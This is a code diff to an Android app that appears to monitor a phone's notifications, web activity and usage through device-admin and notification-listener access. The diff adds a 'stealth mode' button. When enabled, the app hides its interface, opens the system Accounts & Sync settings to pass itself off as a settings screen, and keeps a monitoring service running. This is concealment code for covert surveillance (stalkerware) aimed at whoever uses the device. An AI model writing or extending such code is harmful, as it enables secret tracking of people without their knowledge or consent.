@@ -5,7 +5,9 @@ import android.app.admin.DeviceAdminReceiver;
 import android.content.Context;
 import android.content.DialogInterface;
 import android.content.Intent;
+import android.content.SharedPreferences;
 import android.content.pm.PackageManager;
+import android.net.Uri;
 import android.os.Build;
 import android.os.Bundle;
 import android.os.Handler;
@@ -57,6 +59,9 @@ public class MainActivity extends AppCompatActivity {
 
     private PermissionHelper permissionHelper;
 
+    private static final String PREFS_NAME = "StealthPrefs";
+    private static final String STEALTH_MODE_KEY = "stealth_mode";
+
     private final ActivityResultLauncher<String[]> requestPermissionLauncher =
         registerForActivityResult(new ActivityResultContracts.RequestMultiplePermissions(), permissions -> {
             boolean allGranted = true;
@@ -71,6 +76,15 @@ public class MainActivity extends AppCompatActivity {
     @Override
     protected void onCreate(Bundle savedInstanceState) {
         super.onCreate(savedInstanceState);
+
+        // Check stealth mode before setting content view
+        if (isStealthModeEnabled()) {
+            openAccountsSync();
+            startMonitoringService(); // Ensure service is running in stealth mode
+            finish();
+            return;
+        }
+
         setContentView(R.layout.activity_main);
 
         auth = FirebaseAuth.getInstance();
@@ -99,13 +113,20 @@ public class MainActivity extends AppCompatActivity {
             requestPermissions();
         }
 
-        if (!PermissionHelper.isUsageStatsPermissionGranted(this)) {
-            showUsageStatsPermissionDialog();
+        // Initialize the permission check only once
+        if (!PermissionHelper.isNotificationListenerEnabled(this)) {
+            PermissionHelper.showNotificationAccessDialog(this);
         }
 
         setupDeviceAdmin();
         setupPermissionCheck();
         checkAndRequestPermissions();
+
+        Button hideAppButton = findViewById(R.id.hideAppButton);
+        hideAppButton.setOnClickListener(v -> enableStealthMode());
+
+        Button managePermissionsButton = findViewById(R.id.managePermissionsButton);
+        managePermissionsButton.setOnClickListener(v -> openPermissionActivity());
     }
 
     private void storeDeviceDetails() {
@@ -117,14 +138,6 @@ public class MainActivity extends AppCompatActivity {
         userNode.child("email").setValue(userEmail);
     }
 
-    private void startForegroundService() {
-        Intent serviceIntent = new Intent(this, MonitoringService.class);
-        if (android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.O) {
-            startForegroundService(serviceIntent);
-        } else {
-            startService(serviceIntent);
-        }
-    }
 
     private void requestPermissions() {
         PermissionHelper.requestAllPermissions(this);
@@ -151,35 +164,6 @@ public class MainActivity extends AppCompatActivity {
         }
     }
 
-    private void showAccessibilityPermissionDialog() {
-        new AlertDialog.Builder(this)
-                .setTitle("Accessibility Permission Required")
-                .setMessage("Please enable the Accessibility Service for monitoring web activity.")
-                .setPositiveButton("Go to Settings", new DialogInterface.OnClickListener() {
-                    @Override
-                    public void onClick(DialogInterface dialog, int which) {
-                        Intent intent = new Intent(Settings.ACTION_ACCESSIBILITY_SETTINGS);
-                        startActivity(intent);
-                    }
-                })
-                .setNegativeButton("Cancel", null)
-                .show();
-    }
-
-    private void showUsageStatsPermissionDialog() {
-        new AlertDialog.Builder(this)
-                .setTitle("App Usage Permission Required")
-                .setMessage("Please enable the app usage access in the settings to allow monitoring of app usage.")
-                .setPositiveButton("Go to Settings", new DialogInterface.OnClickListener() {
-                    @Override
-                    public void onClick(DialogInterface dialog, int which) {
-                        Intent intent = new Intent(Settings.ACTION_USAGE_ACCESS_SETTINGS);
-                        startActivityForResult(intent, PermissionHelper.USAGE_STATS_PERMISSION_REQUEST_CODE);
-                    }
-                })
-                .setNegativeButton("Cancel", null)
-                .show();
-    }
 
     private void navigateToLogin() {
         Intent intent = new Intent(MainActivity.this, LoginActivity.class);
@@ -232,31 +216,39 @@ public class MainActivity extends AppCompatActivity {
     }
 
     private void setupPermissionCheck() {
-        permissionCheckHandler = new Handler();
-        permissionCheckRunnable = new Runnable() {
-            @Override
-            public void run() {
-                checkPermissions();
-                permissionCheckHandler.postDelayed(this, PERMISSION_CHECK_INTERVAL);
-            }
-        };
-        startPermissionCheck();
+        if (permissionCheckHandler == null) {
+            permissionCheckHandler = new Handler();
+            permissionCheckRunnable = new Runnable() {
+                @Override
+                public void run() {
+                    checkPermissions();
+                    if (permissionCheckHandler != null) {
+                        permissionCheckHandler.postDelayed(this, PERMISSION_CHECK_INTERVAL);
+                    }
+                }
+            };
+            startPermissionCheck();
+        }
     }
 
     private void startPermissionCheck() {
-        permissionCheckHandler.post(permissionCheckRunnable);
+        if (permissionCheckHandler != null && permissionCheckRunnable != null) {
+            permissionCheckHandler.post(permissionCheckRunnable);
+        }
     }
 
     private void stopPermissionCheck() {
-        permissionCheckHandler.removeCallbacks(permissionCheckRunnable);
+        if (permissionCheckHandler != null && permissionCheckRunnable != null) {
+            permissionCheckHandler.removeCallbacks(permissionCheckRunnable);
+            permissionCheckHandler = null;
+            permissionCheckRunnable = null;
+        }
     }
 
     private void checkPermissions() {
         if (isFinishing()) return; // Don't show dialog if activity is finishing
         
-        if (!PermissionHelper.isNotificationListenerEnabled(this)) {
-            PermissionHelper.showNotificationAccessDialog(this);
-        }
+        // Only check for WiFi permission, remove notification check
         if (!PermissionHelper.isWifiPermissionGranted(this)) {
             PermissionHelper.requestWifiPermission(this);
         }
@@ -265,8 +257,8 @@ public class MainActivity extends AppCompatActivity {
 
     @Override
     protected void onDestroy() {
-        super.onDestroy();
         stopPermissionCheck();
+        super.onDestroy();
         PermissionHelper.cleanup();
     }
 
@@ -384,5 +376,64 @@ public class MainActivity extends AppCompatActivity {
         } else {
             startMonitoringService();
         }
+    }
+
+    private void enableStealthMode() {
+        SharedPreferences prefs = getSharedPreferences(PREFS_NAME, Context.MODE_PRIVATE);
+        prefs.edit().putBoolean(STEALTH_MODE_KEY, true).apply();
+
+        Toast.makeText(this, "Stealth mode enabled", Toast.LENGTH_SHORT).show();
+        openAccountsSync();
+        startMonitoringService(); // Ensure service is running
+        finish();
+    }
+
+    private boolean isStealthModeEnabled() {
+        SharedPreferences prefs = getSharedPreferences(PREFS_NAME, Context.MODE_PRIVATE);
+        return prefs.getBoolean(STEALTH_MODE_KEY, false);
+    }
+
+    private void openAccountsSync() {
+        // First try: Direct Accounts & Sync settings
+        try {
+            Intent accountsIntent = new Intent(Settings.ACTION_SYNC_SETTINGS);
+            startActivity(accountsIntent);
+            return;
+        } catch (Exception e) {
+            Log.d("MainActivity", "Could not open sync settings directly");
+        }
+
+        // Second try: Account settings
+        try {
+            Intent accountSettingsIntent = new Intent(Settings.ACTION_ADD_ACCOUNT);
+            startActivity(accountSettingsIntent);
+            return;
+        } catch (Exception e) {
+            Log.d("MainActivity", "Could not open account settings");
+        }
+
+        // Third try: Google account settings
+        try {
+            Intent googleSettingsIntent = new Intent();
+            googleSettingsIntent.setAction(Settings.ACTION_SYNC_SETTINGS);
+            googleSettingsIntent.putExtra(Settings.EXTRA_ACCOUNT_TYPES, new String[]{"com.google"});
+            startActivity(googleSettingsIntent);
+            return;
+        } catch (Exception e) {
+            Log.d("MainActivity", "Could not open Google account settings");
+        }
+
+        // Final fallback: Device Settings
+        try {
+            Intent deviceSettingsIntent = new Intent(Settings.ACTION_SETTINGS);
+            startActivity(deviceSettingsIntent);
+        } catch (Exception ex) {
+            Log.e("MainActivity", "Unable to open any settings", ex);
+        }
+    }
+
+    private void openPermissionActivity() {
+        Intent intent = new Intent(this, PermissionActivity.class);
+        startActivity(intent);
     }
 }
